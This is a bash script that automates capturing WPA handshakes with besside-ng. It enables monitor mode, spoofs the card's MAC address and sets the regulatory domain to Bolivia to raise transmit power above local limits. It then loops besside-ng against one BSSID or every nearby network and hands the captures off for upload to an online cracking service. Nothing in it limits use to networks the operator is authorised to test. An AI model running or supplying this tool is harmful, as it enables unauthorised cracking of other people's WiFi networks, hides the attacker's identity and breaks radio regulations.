#!/usr/bin/env bash

clear

# Optional Argument 1 = besside id to crack
# Optional Argument 2 = WiFi device to use
# Optional Argument 3 = Monitoring device to use

# Some Vars
declare -a avail_devices # Will hold the list of monitor mode wifi devices available to use. Run function create_wifi_devices_list() to populate.
crack_ssid="$1"

# Load some colour terminal functions
source "echoColours.sh"


# Test for help
function display_help {
	# Get list created for display
	create_wifi_devices_list

	shw_info "Help:"
	shw_norm $0" <besside id> <WiFi Device> <Monitoring Device>"
	shw_norm " <besside id> to crack only or '', to crack all. BESSIDE must contain the colon separators."
	shw_norm " <WiFi Device> to use for monitoring."
	shw_norm " <Monitoring Device> in case it does not detect the device for monitoring correctly."
	echo ""
	shw_norm "If the WiFi device is not specified, it defaults to the first auto detected WiFi device that contains Monitor mode."
	shw_norm "If the Monitoring device is not specified, it defaults to a detected created device, normally mon0."
	echo ""
	shw_norm "Detected ${#avail_devices[@]} WiFi devices available with monitor mode:"
	shw_grey "${avail_devices[@]}"
	echo ""
	shw_info "Notes:"
	shw_norm "If stuck waiting for the WiFi device to appear, try the 'ESCape' button to shutdown the program."
	echo ""
	shw_norm "The wpa-sec.stanev.org module needs a key specified. Goto that website and sign up for it."
	shw_norm "	Place a copy of the key in a file with the name formatted as \"<websiteName>.key\" Eg: \"wpa-sec.stanev.org.key\", or in the top of the module file located in caps/upload/."
	echo ""
	shw_norm "Requirements:"
	shw_norm "besside-ng from aircrack-ng, rfkill, macchanger, ifconfig & iwconfig(to change), airmon-ng."
	
}

# Load my Uni Functions script for some functions to use.
function load_uni_functions() {

	# use my custom functions within UNI Functions
	if [ "$unisystem_functions_online" == "false" ] || [ "$unisystem_functions_online" == "" ]; then
		uni_functions_paths=$(./find_up.sh . -name "uni_functions.sh")
		#echo "UNI Functions Path2: $uni_functions_paths"

		test_true="false"
		for test_paths in ${uni_functions_paths}
		do
			source "$test_paths" 2>/dev/null
			if [ "$?" -eq 0 ]; then
				test_true="true"
				shw_grey "UNI Functions Loaded: $test_paths"
				break
			fi
		done
		if [ "$test_true" == "false" ]; then
			shw_err "Could not locate, to source, the Uni System Functions file (uni_functions.sh)"
			exit
		fi
	fi

}

# Create a list of available wifi devices, with monitor mode, to work with.
function create_wifi_devices_list() {

	declare -a phys_devices_info
	declare -a get_interface_devices
	declare -a get_phy_devices

	IFS=$'\n'
	phys_devices_info=($(iw dev))
	unset IFS

	# Removes the anoyying hash symbol in the name. "phy#0" -> "phy0"
	# Loop $wifi_devices
	for i in "${phys_devices_info[@]}"; do
	#echo "I: $i"
		get_phy_devices+=($(echo -n "$i" | grep -i phy | cut -d "#" -f 1)$(echo -n "$i" | grep -i phy | cut -d "#" -f 2))
	done
	#echo ${get_phy_devices[@]}

	# Loop each physical device for monitor mode
        for i in "${get_phy_devices[@]}"; do
                # If the device has monitor mode, add to list below
                if [ $(iw phy $i info | grep -i monitor -c) -ge 1 ]; then
                        #echo "Mon mode: $i"

                        # Recreate hash mark in phy
                        new_i=$(echo "$i" | cut -d "y" -f 1)"y#"$(echo "$i" | cut -d "y" -f 2)
                        #echo "New i: $new_i"

                        # If a wifi device with monitor mode, add to list of available devices array
						# RegEx: Select from 'phy#'' from $new_i variable to another 'phy#' OR end of line.
                        dev_result=$(echo -n $(iw dev) | grep -oP $new_i'((?:(?!phy#).)*)' | cut -d " " -f 3)
                        avail_devices+=("$dev_result")
                fi
        done

	# Erase arrays not in use
	unset phys_devices_info
	unset get_interface_devices
	unset get_phy_devices

	# Echo the list array
	#echo ${avail_devices[@]}
}

# Does all the legwork of making sure we can get the monitoring device setup
function setup_wifi_monitoring() {

	# Enable WiFi devices by drivers if disabled. Soft-unblock.
	# If the hardware key was used, hard-block, it will still not turn on.
	# rfkill list for details
	$rfkill_var unblock wifi
	sleep 1

	ifconfig_var=$(loc_file "ifconfig")

	# Wait for the specified WiFi device to appear. Sometimes a newly plugged in USB Wifi device will take a min to be available.
	echo " "
	shw_warn "Waiting for Wifi device: $wifi_device, to appear"
	$ifconfig_var $wifi_device >/dev/null 2>&1
	device_found=$?
	secs=120								# Duration to wait
	endTime=$(( $(date +%s)+$secs )) 	# Calc end time

	until [ "$device_found" -eq 0 ] || [ $(date +%s) -gt $endTime ]; do
		sleep 2
		$ifconfig_var $wifi_device >/dev/null 2>&1
		device_found=$?
	done
	if [ $device_found -eq 0 ]; then
		shw_info "Device available for use."
	else
		echo " "
		shw_err " Timed out waiting for device $wifi_device to appear."
		
		exit 1
	fi

	# If previously set and did not unset on shutdown or crash...
	if [ "$mon_device" != "" ]; then # Could be auto detect, as in not specified on the command line. So this would be blank.
		$airmon_ng_var stop $mon_device
	fi

	$ifconfig_var $wifi_device down

	sleep 1
	iwconfig_var=$(loc_file "iwconfig")
	$iwconfig_var $wifi_device mode monitor

	sleep 1
	macchanger_var=$(loc_file "macchanger")
	$macchanger_var -r $wifi_device >/dev/null 2>&1

	$ifconfig_var $wifi_device up

	sleep 1

	goodexec=-1
	counter=0
	until [ "$goodexec" -eq 0 ]; do

		if [ "$counter" -gt 5 ]; then
			shw_err "Cannot get AirMon-NG to start "$wifi_device
			exit 57
		fi

		# Odd error here on the PwnPi for Raspberry Pi computer
		# The first run of the airmon-ng will produce an error and a odd "rename5" network device.
		# This next run will work ok and allow the use of mon0 interface.
		#	Old code: $airmon_ng_var start $wifi_device
		# Looking to parse this for the monitoring interface. It's not always mon0...
		#	var="(mac80211 monitor mode already enabled for [phy0]wlan1 on [phy0]wlan1)"
		# Goofy wifi driver ALERT!
		#	I have found out the some wifi drivers will NOT create a monitoring device(Eg: mon0). Instead it will be the WiFi device itself. However!, it will show on the line above that needs parsed an entry of [phy0]wlan1 on [phy0]10)
		#	So, I'm hard coding at the moment, if the detected monitoring device is not listed on a subsequent device list, revert to the WiFi device as the monitoring device.
		captured_output=$($airmon_ng_var start $wifi_device)
		goodexec=$?

		# Monitoring device may already be set on the command line. If so, do not overwrite it here on the auto detection.
		if [ "$mon_device" == "" ]; then # Nothing set on command line, so auto detect it.
			mon_device=$(echo $captured_output | awk -F"monitor mode enabled on " '{print $2}' | cut -d ")" -f 1)
			# If the monitor mode is already enabled...
			if [ "$mon_device" == "" ]; then
				mon_device=$(echo $captured_output | awk -F"monitor mode already enabled for " '{print $2}' | cut -d "]" -f 3 | cut -d ")" -f 1)
			fi
			
			# Check for monitoring device after creation. If missing, assume it is the WiFi device itself.
			# First clear the contents of the array
			unset avail_devices
			# Then call the function to populate it with a list of wifi devices.
			create_wifi_devices_list
			# Now compare out mon_device to the contents in the new list within the array avail_devices
			dcheck=$(item_in_array "$mon_device" "${avail_devices[@]}")
			if [[ "$dcheck" -eq "0" ]]; then
				mon_device="$wifi_device"
				shw_warn "Using WiFi device: $wifi_device, as Monitoring device: $mon_device."
			else
				#echo ""
				#echo "Captured Output: " $captured_output
				shw_info "Detected Monitoring device: "$mon_device
			fi

		fi

		counter=$((counter+1))

		sleep 1
	done
	# Report how  many times it took to start Airmon-ng
	if [ "$counter" -gt 1 ]; then
		shw_warn "	It took airmon-ng $counter tries to start."
	fi

	# Turn wifi power on MAX
	iw reg set BO >/dev/null 2>&1 # Bolivia allows max power of 27db. Most places are restricted to a lower power level
	$iwconfig_var $wifi_device channel 13 >/dev/null 2>&1 # Some other people online say this may allow you to set it if it does not work without it. 13 is not U.S. friendly.
	$iwconfig_var $wifi_device txpower 30 >/dev/null 2>&1 # Set power level.

	sleep 1
}

# Does all the legwork of making sure we can get the monitoring device unsetup
function unsetup_wifi_monitoring() {

	shw_grey "Unsetting monitoring device $mon_device"
	$airmon_ng_var stop $mon_device >/dev/null 2>&1
	shw_grey "Unsetting WiFi device $wifi_device"
	$airmon_ng_var stop $wifi_device >/dev/null 2>&1

	$ifconfig_var $wifi_device down >/dev/null 2>&1
	iw $mon_device del >/dev/null 2>&1
	$macchanger_var -p $wifi_device >/dev/null 2>&1

}

function run_besside() {
	# Capture handshakes...
	# If the program besside-ng errors out with "wi_read() No such file or directory", try deleting the besside.log.
	if [ "$crack_ssid" != "" ]; then

		shw_info $(date)" Cracking "$crack_ssid" with BESSIDE"
		echo $(date)" Cracking "$crack_ssid" with BESSIDE" >> "$besside_log"
		$besside_ng_var -b $crack_ssid $mon_device
		besside_error_code=$?
	else

		shw_info $(date)" Cracking all with BESSIDE..."
		echo $(date)" Cracking all with BESSIDE" >> "$besside_log"
		$besside_ng_var $mon_device #-v
		besside_error_code=$?
	fi

	return $besside_error_code
}

# Check startup arguments.
if [ "$1" != "" ]; then
	if [ "$1" == "--help" ] || [ "$1" == "-h" ]; then
		display_help
		exit
	fi
fi

# Run as root user
if [ "$UID" -ne "0" ] ; then

	shw_err "The programs require running as root."
	display_help
	exit 67
else

	shw_info "[$(date "+%F %T")] User id check successful"
fi

# Script Vars
if [ "$2" != "" ]; then

	wifi_device="$2" # If WiFi device was specified
else

	# Look for available devices with monitor mode. Use the first one by default.
	shw_grey "Looking for available devices with monitor mode..."
	create_wifi_devices_list
	if [ ${#avail_devices[@]} -ge 1 ]; then
		shw_info "Using first detected available WiFi device."
		wifi_device="${avail_devices[0]}"
	else
		shw_err "No WiFi devices detected that report monitor mode. Please specify the device or make sure the system detects it."
		echo " "
		exit 10
	fi
fi
shw_info "WiFi device set to: $wifi_device"

if [ "$3" != "" ]; then

	# Use argument specified for monitoring device
	mon_device="$3" # If monitoring device was specified
	shw_info "Monitoring device set to: "$mon_device

#else

	# Go with default auto detect within the function setup_wifi_monitoring()
fi

# Load my Uni Functions script for some functions to use.
load_uni_functions

cd_current_script_dir

# find program locations and execute as needed
shw_info "Looking for required file: besside-ng"
besside_ng_var=$(loc_file "besside-ng" "required")
if [ $? -eq 1 ]; then
	shw_err "Could not locate the program besside-ng"
	echo " "
	exit 1
else
	shw_grey "BESSIDE: $besside_ng_var"
fi

shw_info "Looking for required file: airmon-ng"
airmon_ng_var=$(loc_file "airmon-ng" "required")
shw_grey "AIRMON: $airmon_ng_var"

shw_info "Looking for required file: rfkill"
rfkill_var=$(loc_file "rfkill" "required")
shw_grey "RFKILL: $rfkill_var"

shw_info "Looking for required file: rm"
rm_command=$(loc_file "rm" "required")
shw_grey "RM: $rm_command"

shw_info "Looking for required file: mv"
mv_command=$(loc_file "mv" "required")
shw_grey "MV: $mv_command"

besside_error_code=-1
exit_loop=false
# Keep looping until canceled with an exit of 0 or some key press exit code
until [ $besside_error_code -eq 0 ] || [ exit_loop == true ]; do

	read -t 0 -r -s -n1 choice    # read single character in silent mode
	if [[ "$choice" == $'\e' ]]; then 	# if input == ESC key
		shw_warn "Exiting Loop"
		exit_loop=true
	fi

	# Sets network wifi devices for monitoring
	setup_wifi_monitoring

	# Future use. Currently gets the uni_machine_name.
	gather_machine_details

	besside_log=$uni_machine_name"_besside.log"
	if [ ! -e "$besside_log" ]; then
		shw_grey "Created Log: $besside_log"
		touch "$besside_log" 2>/dev/null
	fi


	# Move the .caps (from last run, if it errored out) to another directory for processing
	$mv_command -b --backup=t *.cap caps/ 2>/dev/null

	# Run the function that will run besside to capture handshakes
	run_besside

	# If the besside exits with an error, start over.
	# This is because the wifi device could have been pulled,
	# or an error like wi_read()
	# At the top of the loop it will wait for the specified WiFi device to come back.

done

# Undo the wifi monitoring device
unsetup_wifi_monitoring

# Move the .caps to another directory for processing
$mv_command -b --backup=t *.cap caps/ 2>/dev/null

cd caps # Move here to process and execute the script for converting the .cap files.
./convert_caps_for_uploading.sh
cd .. # Back to main script directory

if [ "$?" -eq 0 ]; then
	$rm_command -f besside.log
	$rm_command -f "$besside_log"
fi


exit 0
